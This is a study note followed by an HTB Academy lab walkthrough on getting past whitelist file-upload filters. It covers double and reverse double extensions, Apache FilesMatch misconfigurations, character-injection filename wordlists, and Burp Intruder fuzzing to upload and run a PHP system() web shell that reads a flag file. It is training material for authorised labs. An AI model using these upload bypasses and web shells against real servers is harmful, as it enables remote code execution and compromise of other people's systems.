# NOTE — Whitelist Filters

## ID
530

## Module
File Upload Attacks

## Kind
notes

## Title
Section 6 — Whitelist Filters

## Description
Bypass whitelist extension validation using double extensions, reverse double extensions exploiting Apache misconfigurations, and character injection techniques to upload and execute PHP web shells.

## Tags
file-upload, whitelist-bypass, reverse-double-extension, apache-misconfiguration, php, burp-intruder

## Commands
- `echo '<?php system("cat /flag.txt"); ?>' > readFlag.php.jpg`
- `curl http://<TARGET_IP>:<PORT>/profile_images/readFlag.phar.jpg`
- Burp Intruder: fuzz `readFlag.§php§.jpg` with PHP extensions wordlist
- `for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do for ext in '.php' '.phps'; do echo "shell$char$ext.jpg" >> wordlist.txt; echo "shell$ext$char.jpg" >> wordlist.txt; echo "shell.jpg$char$ext" >> wordlist.txt; echo "shell.jpg$ext$char" >> wordlist.txt; done; done`

## What This Section Covers
Whitelist filters only allow specific file extensions (e.g., `.jpg`, `.png`, `.gif`) rather than blocking dangerous ones. While more secure than blacklists, they can still be bypassed through double extensions, reverse double extensions exploiting Apache `FilesMatch` misconfigurations, and character injection. The key insight is that weak regex patterns and web server misconfigs create gaps between what the application allows and what the server executes.

## Methodology
1. Attempt upload of a standard PHP shell — confirm the whitelist blocks non-image extensions ("Only images are allowed").
2. Try a **double extension** like `shell.jpg.php` — if the whitelist regex checks only that the name *contains* an image extension (no `$` anchor), this passes the filter and Apache executes the `.php` ending.
3. If the whitelist uses a strict regex anchored with `$` (only matches the *final* extension), switch to **reverse double extension**: `shell.php.jpg`. The file ends in `.jpg` (passes whitelist) but Apache's misconfigured `FilesMatch ".+\.ph(ar|p|tml)"` matches `.php` anywhere in the name and executes it.
4. Create the payload: `echo '<?php system("cat /flag.txt"); ?>' > readFlag.php.jpg`.
5. Upload via Burp Suite, send request to Intruder. Set position markers around the PHP extension only: `readFlag.§php§.jpg`.
6. Load the [PHP extensions wordlist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) as payloads. **Disable URL-encoding**.
7. Run the attack — identify which PHP extensions bypass the blacklist (e.g., `.phar` succeeds).
8. Access the uploaded file: `curl http://<TARGET_IP>:<PORT>/profile_images/readFlag.phar.jpg` to execute the PHP code and retrieve the flag.

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Bypass blacklist + whitelist to read /flag.txt | (flag here) | Reverse double extension `readFlag.phar.jpg` — `.phar` bypasses blacklist, `.jpg` ending passes whitelist, Apache `FilesMatch` executes `.phar` |

## Key Takeaways
- Whitelist regex without a `$` anchor (e.g., `'^.*\.(jpg|jpeg|png|gif)'`) only checks if the name *contains* an image extension — double extensions like `shell.jpg.php` bypass it trivially.
- Even with a strict `$`-anchored whitelist, Apache's `FilesMatch` directive can be misconfigured to match PHP extensions *anywhere* in the filename, enabling reverse double extensions (`shell.php.jpg`).
- Always fuzz with Intruder to discover which PHP extensions survive the blacklist — `.phar`, `.phtml`, `.php7` etc. behave differently depending on server config.
- Character injection (`%00`, `%0a`, `:`, etc.) provides additional bypass vectors especially on older PHP (≤5.x) and Windows servers.
- Disable Burp's URL-encoding when fuzzing file extensions — encoded characters break the extension matching.

## Gotchas
- If you forget to disable URL-encoding in Burp Intruder, all payloads get mangled and nothing uploads successfully.
- The blacklist and whitelist work together here — you need to bypass *both*. A `.php.jpg` upload might pass the whitelist but get blocked by the blacklist on `.php`. Fuzzing for alternative PHP extensions (`.phar`, `.phtml`) is essential.
- Double extension direction matters: `shell.jpg.php` targets weak whitelist regex; `shell.php.jpg` targets Apache `FilesMatch` misconfiguration. Know which attack fits which scenario.

## References
- **PHP Extensions Wordlist (Intruder fuzzing)**: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst

# HTB Solution

# Whitelist Filters

## Question 1

### "The above exercise employs a blacklist and a whitelist test, to block unwanted extensions and only allow image extensions. Try to bypass both to upload a PHP script and execute code to read "/flag.txt""

After spawning the target machine, if students attempt to repeat the attack with `Intruder` as done for the previous question of the "Blacklist Filters" section, they will notice that only files ending with an image extension are allowed, thus they can not use a `basic double extension attack`. Instead, students need to use the `reverse double extension` method, which works on misconfigured Apache web servers.

If students attempt to upload a web shell file with the name "shell.php.jpg" (for example), they will get back "extension not allowed":

![File_Upload_Attacks_Walkthrough_Image_15.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_15.png)

![File_Upload_Attacks_Walkthrough_Image_16.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_16.png)

This signifies that the blacklist filter is blocking PHP files, thus, students need to fuzz for allowed extensions with `Burp Suite's Intruder`. After starting `Burp Suite` and making sure that FoxyProxy is set to the preconfigured "Burp (8080)" option, students need to upload a PHP script that will attempt to read the flag file, and most importantly, has the extension(s) of `.php.jpg`:

        php
`<?php system('cat /flag.txt'); ?>`

        shell-session
`┌─[us-academy-1]─[10.10.14.49]─[htb-ac413848@pwnbox-base]─[~] └──╼ [★]$ cat readFlag.php.jpg <?php system('cat /flag.txt'); ?>`

After intercepting the request sent when clicking on the "Upload" button and sending it to `Intruder`, students need to click on "Positions", then click on "Clear §", and at last click on "Add §" between `.php`:

![File_Upload_Attacks_Walkthrough_Image_17.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_17.png)

Students then need to copy the items of this PHP extensions list from [github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) and paste them under "Payload Options":

![File_Upload_Attacks_Walkthrough_Image_18.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_18.png)

Additionally, students need to disable URL-encoding:

![File_Upload_Attacks_Walkthrough_Image_19.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_19.png)

After clicking on "Start Attack", students will get multiple successful uploads, such as with the `.phar` extension:

![File_Upload_Attacks_Walkthrough_Image_20.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_20.png)

Since the file has been uploaded successfully, students at last need to use either `cURL` or the browser to attain the flag from the URL `http://STMIP:STMPO/profile_images/readFlag.phar.jpg`:

![File_Upload_Attacks_Walkthrough_Image_21.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_21.png)

